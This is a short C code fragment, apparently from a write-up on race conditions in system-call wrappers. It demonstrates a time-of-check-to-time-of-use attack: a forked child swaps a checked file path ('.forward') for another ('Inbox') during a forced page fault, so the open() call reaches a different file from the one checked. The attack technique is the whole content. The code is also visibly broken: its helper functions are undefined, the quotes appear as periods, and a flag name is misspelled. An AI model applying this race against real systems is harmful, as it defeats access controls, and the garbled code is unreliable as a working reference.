#define EVIL_NAME ./home/ko/.forward.
#define REAL_NAME ./home/ko/Inbox.
volatile char *path;
/* Set up path string so nul is on different page. */
path = fork_malloc_lastbyte(sizeof(EVIL_NAME));
strcpy(path, EVIL_NAME);
/* Page out the nul so reading it causes a fault. */
pageout_lastbyte(path, sizeof(EVIL_NAME));
/* Create a child to overwrite path on next fault. */
pid = fork_and_overwrite_up(path, REAL_NAME,
sizeof(REAL_NAME));
fd = open(path, O_RDRW);
